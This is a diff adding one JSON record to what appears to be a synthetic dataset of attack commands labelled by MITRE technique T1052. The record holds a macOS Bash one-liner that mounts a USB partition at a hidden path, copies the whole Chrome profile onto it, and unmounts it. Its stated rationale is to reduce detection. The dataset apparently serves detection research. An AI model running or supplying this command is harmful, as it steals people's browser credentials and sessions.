@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo hdiutil attach -mountpoint /Volumes/.usb_stg -nobrowse /dev/disk2s1 && cp -pR ~/Library/Application\\ Support/Google/Chrome/Default /Volumes/.usb_stg/.chrome && hdiutil detach /Volumes/.usb_stg",
+  "explanation": "Mounts an external partition to a hidden mountpoint, copies browser profile data, then unmounts to stage it for removal.",
+  "rationale_steps": [
+    "Attach external media with a non-standard, hidden mount location.",
+    "Copy target data with preserved timestamps to reduce anomalies.",
+    "Detach to flush writes and minimize exposure window.",
+    "Activity remains fully local to the machine."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-19e64b98-bb61ba6f",
+  "source_prompt_hash": "19e64b98",
+  "timestamp_utc": "2025-09-30T05:31:52.812086Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
